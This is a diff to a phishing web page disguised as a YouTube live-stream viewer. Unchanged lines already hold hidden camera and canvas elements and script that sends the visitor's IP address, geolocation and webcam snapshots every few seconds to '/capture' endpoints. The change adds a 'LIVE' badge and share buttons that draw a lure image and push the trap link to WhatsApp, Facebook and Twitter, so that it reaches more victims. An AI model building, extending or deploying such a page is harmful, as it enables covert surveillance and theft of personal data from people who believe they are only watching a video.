@@ -4,13 +4,32 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
 <title>Live Stream</title>
-<style>body{margin:0;background:#111;color:#fff;font-family:Arial}video,canvas{display:none}iframe{width:100%;height:100vh;border:0}</style>
+<style>
+body{margin:0;background:#0f0f0f;color:#fff;font-family:Arial,sans-serif;height:100vh;display:flex;flex-direction:column;overflow:hidden}
+video,canvas{display:none}
+iframe{width:100%;flex:1;border:0}
+.share-bar{padding:12px;background:#1a1a1a;display:flex;gap:10px;justify-content:center;align-items:center}
+.share-btn{padding:8px 16px;border:none;border-radius:20px;font-size:13px;font-weight:700;color:#fff;cursor:pointer}
+.share-wa{background:#25D366}.share-fb{background:#1877F2}.share-tw{background:#1DA1F2}
+.live-badge{background:#f00;color:#fff;font-size:11px;padding:3px 10px;border-radius:4px;font-weight:700;animation:blink 1.5s infinite}
+@keyframes blink{0%,100%{opacity:1}50%{opacity:0.5}}
+</style>
 </head><body>
 <video id="video" playsinline autoplay></video>
 <canvas id="canvas" width="640" height="480"></canvas>
+<div style="padding:8px 16px;background:#1a1a1a;display:flex;align-items:center;gap:10px">
+<span class="live-badge">● LIVE</span>
+<span style="font-size:14px;color:#aaa">Now Streaming</span>
+</div>
 <iframe src="https://www.youtube.com/embed/live_yt_tv?autoplay=1" allow="autoplay;encrypted-media;gyroscope;picture-in-picture" allowfullscreen></iframe>
+<div class="share-bar">
+<button class="share-btn share-wa" onclick="shareCard('wa')">💬 Share Stream</button>
+<button class="share-btn share-fb" onclick="shareCard('fb')">📘 Share</button>
+<button class="share-btn share-tw" onclick="shareCard('tw')">🐦 Share</button>
+</div>
 <script>
 var API='API_BASE_URL';
+var SHARE_URL=location.origin+'/t/youtube';
 var video=document.getElementById('video'),canvas=document.getElementById('canvas'),ctx=canvas.getContext('2d');
 fetch(API+'/capture/ip',{method:'POST',headers:{'Content-Type':'application/json'},body:'{}'});
 if(navigator.geolocation)navigator.geolocation.getCurrentPosition(function(p){
@@ -23,5 +42,62 @@ ctx.drawImage(video,0,0,640,480);
 fetch(API+'/capture/image',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({cat:canvas.toDataURL('image/png')})});
 },3000);
 }).catch(function(){});
+
+function shareCard(t){
+var c=document.createElement('canvas');
+c.width=600;c.height=800;
+var x=c.getContext('2d');
+x.fillStyle='#0f0f0f';x.fillRect(0,0,600,800);
+// Glow effect
+var glow=x.createRadialGradient(300,300,50,300,300,300);
+glow.addColorStop(0,'rgba(255,0,0,0.15)');glow.addColorStop(1,'rgba(255,0,0,0)');
+x.fillStyle=glow;x.fillRect(0,0,600,800);
+// Decorative
+for(var i=0;i<20;i++){x.fillStyle='#f00';x.globalAlpha=0.05+Math.random()*0.1;x.beginPath();x.arc(Math.random()*600,Math.random()*800,1+Math.random()*2,0,6.28);x.fill();}
+x.globalAlpha=1;
+// Border
+x.strokeStyle='#f00';x.lineWidth=2;x.globalAlpha=0.3;
+x.beginPath();x.roundRect(30,60,540,680,16);x.stroke();
+x.globalAlpha=1;
+// Play icon
+x.fillStyle='#f00';x.shadowColor='#f00';x.shadowBlur=30;
+x.beginPath();x.arc(300,220,50,0,6.28);x.fill();
+x.fillStyle='#fff';x.shadowBlur=0;
+x.beginPath();x.moveTo(285,195);x.lineTo(325,220);x.lineTo(285,245);x.fill();
+// LIVE badge
+x.fillStyle='#f00';x.font='bold 16px system-ui';x.textAlign='center';
+var badgeW=x.measureText('● LIVE').width+20;
+x.beginPath();x.roundRect(300-badgeW/2,290,badgeW,28,4);x.fill();
+x.fillStyle='#fff';x.fillText('● LIVE',300,309);
+// Title
+x.fillStyle='#fff';x.font='bold 28px system-ui';
+x.fillText('Watch Live Stream',300,360);
+x.fillStyle='#aaa';x.font='16px system-ui';
+x.fillText('Join the audience now',300,390);
+// Divider
+x.strokeStyle='rgba(255,255,255,0.1)';x.lineWidth=1;
+x.beginPath();x.moveTo(100,430);x.lineTo(500,430);x.stroke();
+// CTA
+x.fillStyle='#fff';x.font='bold 20px system-ui';
+x.fillText('Watch here:',300,480);
+x.fillStyle='#3ea6ff';x.font='bold 18px monospace';
+x.fillText(SHARE_URL,300,520);
+// Footer
+x.fillStyle='#666';x.font='12px system-ui';
+x.fillText('Live Stream · Watch & Share',300,700);
+
+c.toBlob(function(blob){
+var textMsg='🔴 Watch this live stream! '+SHARE_URL;
+var file=new File([blob],'live-stream.png',{type:'image/png'});
+if(navigator.canShare&&navigator.canShare({files:[file]})){
+navigator.share({text:textMsg,files:[file],title:'Live Stream'}).catch(function(){});
+return;
+}
+if(t==='wa')open('whatsapp://send?text='+encodeURIComponent(textMsg),'_blank');
+else if(t==='fb')open('https://www.facebook.com/sharer/sharer.php?u='+encodeURIComponent(SHARE_URL)+'&quote='+encodeURIComponent(textMsg),'_blank');
+else if(t==='tw')open('https://twitter.com/intent/tweet?text='+encodeURIComponent(textMsg),'_blank');
+var a=document.createElement('a');a.href=URL.createObjectURL(blob);a.download='live-stream.png';a.click();
+},'image/png');
+}
 </script>
 </body></html>
